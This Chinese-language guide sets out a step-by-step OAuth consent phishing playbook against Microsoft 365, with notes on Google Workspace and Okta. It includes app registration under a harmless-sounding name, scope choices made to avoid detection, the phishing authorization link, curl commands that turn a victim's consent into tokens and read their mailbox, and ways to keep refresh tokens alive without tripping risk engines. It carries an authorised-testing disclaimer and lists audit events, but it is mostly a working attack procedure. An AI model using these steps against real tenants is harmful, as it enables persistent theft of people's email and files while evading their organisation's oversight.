# OAuth 同意钓鱼全流程

这是「不需要伪造任何页面」的钓鱼方式 —— 用户看到的是**微软/谷歌的真实授权页**，
安全意识在这里完全不起作用。MFA 也拦不住，因为 MFA 保护的是「认证」，
而这里发生的是「授权」。

**合规前提**：应用注册会留下明确的审计记录（租户管理员能在「企业应用」里看到
新增应用、谁同意的、授予了什么范围）。在授权演练里这是**可以测的加分项**；
在非授权场景里这就是直接证据。开始前确认授权书写明了这种方式。

---

## 一、为什么它比伪造页面有效

| 维度 | 伪造登录页 | AiTM 反代 | **OAuth 同意** |
| --- | --- | --- | --- |
| 用户看到的页面 | 假的（细看能发现域名不对） | 真的（但域名是你的） | **真的是微软/谷歌的域名** |
| MFA 是否拦 | 拦（用户输完发现被骗） | 不拦（代理透传） | **不拦（不涉及认证）** |
| 需要域名/证书 | 需要 | 需要 | **不需要** |
| 需要被审计的机器 | 需要 | 需要 | **不需要** |
| 有效期 | 会话 cookie（小时级） | 会话 cookie（小时级） | **refresh_token（默认 90 天，可续期）** |
| 主要检测点 | 域名信誉 | conditional access | **Consent 审计事件（很多组织没人看）** |

**唯一弱点**：需要目标租户允许「用户自行同意应用」（User consent for apps）。
很多企业已经关掉了这个设置 —— 这是第一步必须验证的事。

---

## 二、先验证前提（这一步不通，后面全白做）

```bash
TENANT="target.onmicrosoft.com"   # 或 target.com（若已绑定）
CLIENT_ID="<你自己注册的应用 id>"

# 试探：这个租户允许用户自行同意吗？
# 打开授权链接，若出现「需要管理员批准」= 关掉了；若直接出同意页 = 可行
echo "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/authorize?\
client_id=$CLIENT_ID&response_type=code&redirect_uri=http://localhost&\
scope=openid%20offline_access%20Mail.Read&prompt=consent"
```

**判据**：
- 出现「**Need admin approval**」→ 该租户关了用户同意，**这条路死了**，转 AiTM
- 出现正常的「此应用需要访问…」同意页 → 可行，继续

也可以先查租户的 consent policy（需要能读到该租户的公开配置，通常查不到，
只能用上面的链接实测）。

---

## 三、应用注册（O365 / Azure AD）

```text
1) 用**任意** Microsoft 账号登录 https://portal.azure.com
   （不需要是目标租户的账号 —— 多租户应用可以被任何租户的用户同意）
2) Azure Active Directory → 应用注册 → 新注册
   · 名称：起一个像正经工具的名字（如 "Mail Archive Sync"、"Calendar Helper"）
   · 支持的账户类型：**「任何组织目录中的账户」**（多租户，关键）
   · 重定向 URI：Web → https://your-vps/callback
3) 证书和密码 → 新客户端密码 → 记下 value（只显示一次）
4) API 权限 → 添加权限 → Microsoft Graph → 委托的权限：
   · Mail.Read          读邮件（最核心）
   · Mail.ReadWrite     读+改（可标记已读、建规则转发）—— 更隐蔽
   · Files.ReadWrite    读 OneDrive/SharePoint
   · offline_access     拿 refresh_token（**没有这个就只有 1 小时有效期**）
   · User.Read          读基本资料
5) 授予管理员同意：**不要点** —— 点了就需要目标租户管理员批准，用户同意路径失效
```

**范围选择的取舍**：

| 范围 | 能做什么 | 检测风险 |
| --- | --- | --- |
| `Mail.Read` | 读全部邮件（含附件） | 低（只读，很多审计规则不管只读） |
| `Mail.ReadWrite` | 读 + 建收信规则（**把特定邮件转发到你的地址**） | 中（建规则会在邮箱规则审计里留痕） |
| `Mail.Send` | 以受害者身份发信（内部钓鱼的跳板） | **高**（外发会触发 DLP） |
| `Files.ReadWrite` | 读网盘（合同/财务表常在这） | 中 |
| `Directory.Read.All` | 读整个组织架构（做画像神器） | **高**（管理员级范围，多数租户要审批） |

**实战建议**：先只申请 `Mail.Read` + `offline_access`。范围越少，同意页越不吓人，
成功率越高。拿到 token 后读邮件就够了 —— 邮件里什么都有（VPN 配置、内部文档链接、
其他系统的重置密码邮件）。

---

## 四、诱导与换取 token

```text
授权链接（这就是你发出去的东西）：
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<CLIENT_ID>
  &response_type=code
  &redirect_uri=https://your-vps/callback
  &scope=openid%20offline_access%20Mail.Read
  &prompt=consent
  &state=<每个目标唯一标识>
```

`state` 参数用来区分「谁点的」—— 每个目标一个唯一值，回调时记录下来。

```bash
# 回调收到 code 后换 token
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "code=$CODE" \
  -d "redirect_uri=https://your-vps/callback" \
  -d "grant_type=authorization_code" \
  -d "scope=openid offline_access Mail.Read"
```

返回里看两个字段：

```json
{
  "access_token": "...",      // 1 小时有效
  "refresh_token": "..."      // 90 天有效（活跃使用可续期）← 这个才是战果
}
```

---

## 五、验伤（最容易自欺的一步）

**拿到 token ≠ 成功。** 必须真的读到数据。

```bash
# 1) 确认身份（读的是谁）
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://graph.microsoft.com/v1.0/me" | head -c 300
#    判据：返回里 upn / mail 是目标本人，不是「你的测试账号」

# 2) 确认能读邮件（真数据）
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=3&\$select=subject,from,receivedDateTime" \
  | head -c 600
#    判据：subject 是真实业务邮件（不是「欢迎使用」这类）；from 是真实同事/外部伙伴

# 3) 确认 refresh_token 有效（这决定战果能持续多久）
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH" \
  -d "scope=openid offline_access Mail.Read"
#    判据：返回新的 access_token = 可长期使用；返回 invalid_grant = 已被撤销
```

**三类假成功**（都真实发生过）：

1. **只拿到 access_token，没有 refresh_token** —— 通常是因为 `offline_access` 没申请，
   或者用了 `response_type=token`（隐式流）。1 小时后失效，报告里写「拿到访问权限」是虚的。
2. **token 能读 `/me`，但读不到邮件** —— 范围没批（管理员部分同意），
   或租户有 conditional access 限制（要求合规设备）。
3. **读到了邮件，但全是「欢迎」类系统邮件** —— 说明这个账号是新建的测试号，
   不是目标本人。检查 `/me` 返回的 `createdDateTime`。

---

## 六、长期维持（refresh_token 的续期）

```text
refresh_token 默认 90 天。以下行为会延长（每次使用通常续 90 天）：
· 定期用 refresh_token 换新 access_token（建议每 30 天一次）
· 不要高频调用（异常频率会触发风险引擎，token 被撤销）
· 不要从多个地理位置使用（会触发「不可能旅行」→ 强制重新认证）

被撤销的信号：
· 换 token 返回 invalid_grant
· 或返回 AADSTS700082（refresh token 过期/撤销）
· 或返回 AADSTS50173（需要重新认证，通常是密码改了或管理员撤销了同意）
```

**纪律**：拿到 refresh_token 后**不要**大量读邮件（读全量会明显异常）。
按需检索（搜关键词）风险低得多。

---

## 七、其他平台的差异

### Google Workspace

```text
差异点：
· 应用注册在 Google Cloud Console → OAuth 同意屏幕（不是 Azure）
· **未验证的应用**会显示「此应用未经验证」警告（O365 没这个警告）
  → 需要走 Google 的验证流程（要域名所有权 + 隐私政策），周期几天
· 「内部」类型的应用只能同域使用 → 必须选「外部」
· 同意后可在 myaccount.google.com/permissions 里撤销（用户自己能撤）

范围对应：
· Mail.Read    → https://www.googleapis.com/auth/gmail.readonly
· offline_access→ 用 access_type=offline 参数（不是 scope）
```

### Okta

```text
差异点：
· Okta 的授权页更显眼（会显示应用 logo 和名称）
· 很多 Okta 租户强制要求管理员审批新应用（比 O365 严格）
· scope 体系不同（okta.users.read / okta.apps.read）
· 检测点更多（Okta 的系统日志有专门的 app.oauth2.as.consent 事件）
```

### 检测点对照（演练时要测的就是这些）

| 平台 | 关键审计事件 | 在哪看 |
| --- | --- | --- |
| O365 | `Consent to application` | Azure AD → 审计日志；或「企业应用」列表新增项 |
| O365 | `Add app role assignment` | 同上 |
| Google | `OAuth token` / `Authorize` | Workspace 管理控制台 → 报告 → 登录活动 |
| Okta | `app.oauth2.as.consent` | Okta System Log |

**演练的核心问题**：**对方有没有人盯这些日志？多久发现？**
多数组织的答案是「没人看」—— 这就是报告里最有价值的一条。

---

## 八、常见坑

1. **点了「授予管理员同意」** —— 用户同意路径直接失效，必须管理员批准。注册时别点。
2. **忘了 `offline_access`** —— 只拿到 1 小时的 access_token，报告写「已获取邮箱访问」是虚假的。
3. **用 `response_type=token`（隐式流）** —— 拿不到 refresh_token。必须用 `code` 流。
4. **redirect_uri 不匹配** —— Azure 会直接报错，不返回 code。必须和注册时填的完全一致（含末尾斜杠）。
5. **只申请了 `Mail.Read` 却想读文件** —— 范围不足会 403。按需加范围，但加范围会重新触发同意。
6. **拿到 token 就去读全量邮件** —— 触发异常行为检测，token 被撤销，还惊动对方。
7. **在多租户应用里用 `common` 端点** —— 这是对的（多租户就该用 common）；
   但若用了具体租户 id，其他租户的用户就同意不了。
8. **忘了清理** —— 演练结束后必须撤销应用、删除 refresh_token。
   留在那儿的 refresh_token 是**真实的安全隐患**（不是演练道具）。